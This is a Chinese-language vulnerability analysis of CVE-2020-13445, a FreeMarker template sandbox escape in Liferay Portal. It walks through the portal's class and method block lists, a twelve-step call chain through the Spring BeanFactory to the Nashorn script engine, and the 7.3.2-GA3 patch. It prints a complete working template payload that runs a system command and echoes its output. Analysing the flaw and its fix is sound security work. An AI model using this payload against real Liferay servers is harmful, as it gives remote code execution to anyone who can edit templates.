0x01 前言
=======

GHSL小组成员Alvaro Munoz在2020年3月报告了Liferay Portal中的模板注入漏洞，通过其描述可以得知具有编辑模板权限的用户可以实现通过该漏洞实现远程代码执行，而漏洞产生原因是由于绕过了Liferay Portal自定义的安全保护机制从而使得允许通过Freemarker模板实例化任意对象完成沙箱逃逸（CVE-2020-13445）

0x02 模板安全策略
===========

在Liferay Portal中实现了自定义的ObjectWrapper，在访问对象时将会触发wrap方法（使用黑、白名单校验）  
相关代码如下  
`class com.liferay.portal.template.freemarker.internal.RestrictedLiferayObjectWrapper`  
![image.png](https://shs3.b.qianxin.com/butian_public/fb2a542ce4037f4a3f31ce34b380163c1.jpg)  
可以看到在构造方法中传入 `String[] allowedClassNames`, `String[] restrictedClassNames` 及 `String[] restrictedMethodNames` 参数  
在 `wrap` 方法中调用 `_checkClassIsRestricted` 方法进行校验。  
注：在低版本中不存在 `RestrictedLiferayObjectWrapper` 类，而核心逻辑位于 `LiferayObjectWrapper` 中

而黑白名单来自于 `com.liferay.portal.template.freemarker.configuration.FreeMarkerEngineConfiguration`  
![image.png](https://shs3.b.qianxin.com/butian_public/f31819f898fcfbc5d119345b8bf04a993.jpg)

受到限制的类

```php
com.liferay.portal.json.jabsorb.serializer.LiferayJSONDeserializationWhitelist
java.lang.Class
java.lang.ClassLoader
java.lang.Compiler
java.lang.Package
java.lang.Process
java.lang.Runtime
java.lang.RuntimePermission
java.lang.SecurityManager
java.lang.System
java.lang.Thread
java.lang.ThreadGroup
java.lang.ThreadLocal
```

受到限制的变量

```php
httpUtilUnsafe
objectUtil
serviceLocator
staticFieldGetter
staticUtil
utilLocator
```

我们还需要关注Liferay Portal中的类解析器 `com.liferay.portal.template.freemarker.internal.LiferayTemplateClassResolver`  
此类是 `freemarker.core.TemplateClassResolver` 接口的实现，在加载class时将调用 `resolve` 方法  
![image.png](https://shs3.b.qianxin.com/butian_public/fb48fe513f7128635e60894feff1903b7.jpg)

- Execute、ObjectConstructor 无法被加载
- 非白名单中的类无法被加载

以上限制将导致无法在模板中创建对象或是经过ClassLoader加载Class等方法来利用

0x03 漏洞分析
=========

> 虽然存在着诸多限制，但是允许通过模板上下文中暴露的大量对象提供的方法完成一个链式调用后绕过安全机制来实例化任意对象最终完成逃逸导致远程代码执行

在模板上下文中存在着许多变量，每个变量都对应到一个对象，而这些对象中暴露的方法可能会存在问题。  
其中`${renderRequest}` 的类型是 `class com.liferay.portlet.internal.RenderRequestImpl`，同时它是 `class com.liferay.portal.kernel.portlet.LiferayRenderRequest` 的子类  
在父类 `class com.liferay.portlet.internal.RenderRequestImpl` 中存在一个getter方法 `public PortletContext getPortletContext()`  
![image.png](https://shs3.b.qianxin.com/butian_public/f9838252e01931d38e501222d7744a06c.jpg)  
通过此方法我们可以获取到 `class com.liferay.portlet.internal.PortletContextImpl` 的实例（PortletContext）

在 `PortletContextImpl` 中存在getter方法为 `public ServletContext getServletContext()`  
![image.png](https://shs3.b.qianxin.com/butian_public/fb94c79e9a6841aaa0f0a4852c13b60ca.jpg)  
通过此方法我们可以继续获取到 `ServletContext`，但它是由ASM生成，而并非是容器原生的 `ServletContext`

不过这个 `ServletContext` 提供了 `getContext` 方法，接着调用该方法我们可以获得容器原生的 `ServletContext` 实例（Tomcat中的`ApplicationContextFacade`）  
![image.png](https://shs3.b.qianxin.com/butian_public/fde1e406d68e454216e06cba8477b5953.jpg)  
至于为什么要获取到容器的 `ServletContext`，是因为在下一步我们需要从Servlet上下文中通过 `getAttribute` 方法获取到Spring的 `ApplicationContext`  
这个保留在上下文Attribute中的命名为 `org.springframework.web.context.WebApplicationContext.ROOT`

经过测试由ASM生成的 `ServletContext` 是无法获取到该Attribute的  
![image.png](https://shs3.b.qianxin.com/butian_public/f9eb8a25dd87116d36c35062cb4f8f850.jpg)

而容器的 `ServletContext` 是可以获取到的  
![image.png](https://shs3.b.qianxin.com/butian_public/fb893adef092db42797b4f0c9d43a14ee.jpg)

此时我们已经拿到到了Spring的 `ApplicationContext`  
实例类型为Liferay Portal中实现的 `class com.liferay.portal.spring.context.PortalApplicationContext`，它是 `class org.springframework.web.context.support.XmlWebApplicationContext` 的子类

目前获取到的 Spring ApplicationContext 可以做很多的事情，但是要想达到远程代码执行的效果还是需要继续探索。  
我们可以通过获取到 `BeanFactory` 篡改 `BeanDefinitions` 中的 `beanClass` 类型为自定义类型 以及 `scope` 作用域为"prototype"，然后调用 `getBean` 方法， Spring将实例化一个我们定义的类型对象并返回达到实例化任意对象的效果。

这里的思路是实例化JDK中的 `Nashorn` 脚本引擎工厂，接着调用 `getScriptEngine` 获取 `Nashorn` 引擎实例，再调用 `eval` 方法来执行脚本。  
寻找 `BeanDefinition` 时，只需要注意构造方法的参数即可，例如 `Nashorn` 脚本引擎工厂为无参构造方法。  
其中名为 `com.liferay.document.library.kernel.service.DLAppService` 的 `BeanDefinition` 是符合这个条件的。  
![image.png](https://shs3.b.qianxin.com/butian_public/f45fff3036ac96433e21eb1ef0e18d8da.jpg)

**整个调用链及利用如下：**

1. 通过内置对象 ${renderRequest} 调用 getPortalContext() 获取 PortalContext 对象
2. 通过 PortalContext 获取 ServletContext （ServletContextDelegate - 由 ASM 生成）
3. 通过 ServletContextDelegate 调用 getContext("/") 获取 ApplicationContext
4. 通过 ApplicationContext 调用 getAttribute("org.springframework.web.context.WebApplicationContext.ROOT") 获取 PortalApplicationContext（继承至 Spring XmlWebApplicationContext）
5. 通过 PortalApplicationContext 调用 getBeanFactory() 获取 LiferayBeanFactory （继承至 Spring DefaultListableBeanFactory）
6. 通过 LiferayBeanFactory 调用 getBeanDefinition("com.liferay.document.library.kernel.service.DLAppService") 获取 DLAppService 的 BeanDefinition
7. 通过 BeanDefinition 调用 setScope("prototype") 修改 scope 为 "prototype" （非单例）
8. 通过 BeanDefinition 调用 setBeanClassName("jdk.nashorn.api.scripting.NashornScriptEngineFactory") 修改 BeanClass 为 "jdk.nashorn.api.scripting.NashornScriptEngineFactory" (Nashorn 脚本引擎工厂)
9. 通过 LiferayBeanFactory 调用 registerBeanDefinition 将篡改后的 BeanDefinition 重新注册
10. 通过 LiferayBeanFactory 调用 getBean 将会导致创建 Nashorn 脚本引擎工厂对象并获取
11. 通过 NashornScriptEngineFactory 调用 getScriptEngine() 获取 Nashorn 脚本引擎对象
12. 通过 NashornScriptEngine 调用 eval 执行恶意脚本，触发远程代码执行

**构造回显 Payload**

```php
<#assign sp=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().getBeanDefinition("com.liferay.document.library.kernel.service.DLAppService")>
<#assign ec=sp.setScope("prototype")>
<#assign eb=sp.setBeanClassName("jdk.nashorn.api.scripting.NashornScriptEngineFactory")>
<#assign xx=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().registerBeanDefinition("sp",sp)>
<#assign res=renderRequest.getPortletContext().getServletContext().getContext("/").getAttribute("org.springframework.web.context.WebApplicationContext.ROOT").getBeanFactory().getBean("sp").getScriptEngine().eval("var a = new java.lang.ProcessBuilder['(java.lang.String[])'](['cmd','/c','whoami']);var b=a.start().getInputStream();var c=Java.type('com.liferay.portal.kernel.util.StreamUtil');var d=new java.io.ByteArrayOutputStream();c.transfer(b,d,1024,false);var e=new java.lang.String(d.toByteArray());e")>
${res}
```

![image.png](https://shs3.b.qianxin.com/butian_public/ff1a433e89f22477c1e61c97ef08f7f9e.jpg)

触发后成功执行  
![image.png](https://shs3.b.qianxin.com/butian_public/f08279dae18047d25281949eb55fc62c6.jpg)

0x04 补丁分析
=========

在 `Liferay Portal 7.3.2-GA3` 中较之前版本增加了如下黑名单，其中增加了 `com.liferay.portal.spring.context.*` 导致无法访问 Spring ApplicationContext

```php
com.ibm.*
com.liferay.portal.spring.context.*
io.undertow.*
org.apache.*
org.glassfish.*
org.jboss.*
org.springframework.*
org.wildfly.*
weblogic.*
```

参考： <https://github.com/liferay/liferay-portal/blob/7.3.2-ga3/modules/apps/portal-template/portal-template-freemarker/src/main/java/com/liferay/portal/template/freemarker/configuration/FreeMarkerEngineConfiguration.java>